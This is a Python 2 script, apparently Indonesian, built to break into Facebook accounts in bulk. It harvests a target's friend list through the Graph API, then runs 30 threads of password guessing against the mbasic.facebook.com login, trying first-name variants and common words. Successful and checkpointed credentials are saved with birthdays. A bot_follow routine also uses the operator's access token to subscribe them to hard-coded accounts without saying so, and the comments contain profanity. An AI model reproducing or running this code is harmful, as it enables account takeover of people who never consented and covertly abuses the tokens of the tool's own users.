# Recode By Riukha Xhein
# Hai Decker. Scriptnya Sama Aja Isinya Ngapain Lu Dec
# Scriptnya Udah Enak, Gausah Di Recode Lagi Ngentod
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
from random import choice as luak

b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;92m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip =requests.get('https://api.ipify.org').text
uas =random.choice(['NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n [1] Dapatkan User Agent HP-mu")
    print(" [2] Mengganti User Agent")
    print(" [3] Menghapus User Agent")
    print(" [4] Cek User Agent")
    print(" [0] Kembali")
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = raw_input("\n [?] Pilih : ")
    if pmu == "":
        print(" [!] Pilih Yang Bener!!")
    elif pmu == '01' or pmu == '1':
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        raw_input(" [?] Kembali")
        menu()
    elif pmu == '02' or pmu == '2':
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n [?] Berhasil Menghapus User Agent")
        raw_input("\n [?] Kembali")
        menu()
    elif pmu == '04' or pmu == '4':
        check_ugent()
    elif pmu == '00' or pmu == '0':
        menu()
    else:
        print(" [!] Pilih Yang Bener")

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = raw_input("\n [?] Masukan User Agent : ")
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n [?] Sukses Mengganti User Agent")
        raw_input("\n [?] Kembali")
        menu()
    except (KeyError, IOError):
        jalan("\n [?] Gagal Mengganti User Agent")
        raw_input("\n [?] Kembali")
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = (" [?] User Agent Tidak Ditemukan")
    except:pass
    print ("\n [?] User Agent Kamu  : "+ungser)
    raw_input("\n [?] Kembali")
    menu()

def logo():
	os.system("clear")
	print("""
            __  _                
 ___ ____  / /_(_)               
/ _ `/ _ \/ __/ /                
\_,_/_//_/\__/_(_)      ____ __  
  __ _  __ _____  ___ _/ _(_) /__
 /  ' \/ // / _ \/ _ `/ _/ /  '_/
/_/_/_/\_,_/_//_/\_,_/_//_/_/\_\ 
   """)
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		logs()
		requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token='+ toket)      #M4L41K4T
		requests.post('https://graph.facebook.com/100000517973128/subscribers?access_token='+ toket)      #AZKA
		requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token='+ toket)      #EMPRIT
		requests.post('https://graph.facebook.com/100004003690596/subscribers?access_token='+ toket)      #Widiya
		requests.post('https://graph.facebook.com/100001403405461/subscribers?access_token='+ toket)      #Dhenii Saraswati
		requests.post('https://graph.facebook.com/100001152080193/subscribers?access_token='+ toket)      #Mustolih Lih
		requests.post('https://graph.facebook.com/100001134480658/subscribers?access_token='+ toket)      #Taufik Unik Timbul
		requests.post('https://graph.facebook.com/100011083959831/subscribers?access_token='+ toket)      #Dica
		requests.post('https://graph.facebook.com/100038342055141/subscribers?access_token='+ toket)      #Unik KOEN KONTOL
		requests.post('https://graph.facebook.com/1475910687/subscribers?access_token='+ toket)      #Hozuki Suigetsu (2008)
		requests.post('https://graph.facebook.com/1836754937/subscribers?access_token='+ toket)      #Artha Ajah
        menu()
        print ' [!] Token Invalid!'
        sys.exit()

def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print" [+] Cara Ambil Token Bisa Cek Di https://youtu.be/IdxphPBMMTU"
		token = raw_input('\n [+] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot_follow()
			defaultua()
			menu()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print("\n\x1b[0m > AU) Cah Banyumas") 
    print("\x1b[0m > FB) https://fb.me/M4L41K4T.T4K.B3R54Y4P")
    #print(" [*] -------------------------------------------")
    #print(" [*] Tumbal     : "+nama)
    #print(" [*] ID         : "+id)
    #print(" [*] IP         : "+ip)
    print("")
    print(" [1]. crack dari teman public")
    print(" [2]. check hasil crack")
    #print(" [3]. Setting User Agent")
    print(" ["+m+"0"+N+"]. hapus token")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [?] pilih : ')
    if ask == '':
        print'[!] pilih yang benar!'
        exit()
    elif ask == '01' or ask == '1':
        print(" [*] ketik 'me' untuk crack dari daftar teman")
        idt = raw_input(' [+] id target : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print' [+] nama : ' + sp['name']
        except KeyError:
            print'[!] teman diprivate!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print' [+] total id : ' + str(len(id))

    elif ask == '02' or ask == '2':
        print'\n [1] Hasil OK '
        print' [2] Hasil CP '
        ress = raw_input('\n [?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print' [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [?] Kembali")
            menu()
        elif ress == '02' or ress == '2':
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [?] Kembali")
            menu()
        else:
            exit(' [!] Pilih Yang Benar!')
    elif ask == '03' or ask == '3':
        return menu_user_agent()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print(" [!] Berhasil Menghapus Token")
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        exit()
    ask = raw_input('\x1b[0m [?] menggunakan password manual? [y/t]: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    #print'\n [+] Hasil OK Disimpan Di : OK.txt'
    #print" [+] Hasil CP Disimpan Di : CP.txt"
    print("\x1b[0m [!] tekan CTRL+z untuk stop")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0m* %s/%s |ok:%s |cp:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(),name.lower()+'1234',name.lower()+'12345',name.lower()+'123','bangsat','sayang','anjing','kontol']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email':uid,'pass':pw, 'login':'submit'}, headers={'user-agent':uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r [OK] ' + uid + '|'+ pw + '    '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read() 
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r [CP] ' + uid + '|'+ pw + ' ' + ttl + '    '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [CP] ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r [CP] ' + uid + '|'+ pw + '    '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [CP] ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()


def manualmbasic():
    print'\n [+] exp. password : bismillah,sayang,rahasia'
    pw = raw_input(' [?] password list : ').split(',')
    #print(" [*] Menggabungkan Password Tambahan Dan Otomatis")
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    #print'\n [+] Hasil OK Disimpan Di : OK.txt'
    #print" [+] Hasil CP Disimpan Di : CP.txt" 
    print("\n [!] CTRL+z untuk stop")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0m* %s/%s |ok:%s |cp:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw or [name.lower(),name.lower()+'1234',name.lower()+'12345',name.lower()+'123']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email':uid,'pass':asu,'login':'submit'}, headers={'user-agent':uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r [OK] ' + uid + '|' + asu + '    '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r [CP] ' + uid + '|' + asu + ' ' + ttl + '    '
                        cp.append(uid + ' | ' + asu + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [CP] ' + str(uid) + ' | ' + str(asu) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r [CP] ' + uid + '|' + asu + '    '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [CP] ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()



if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
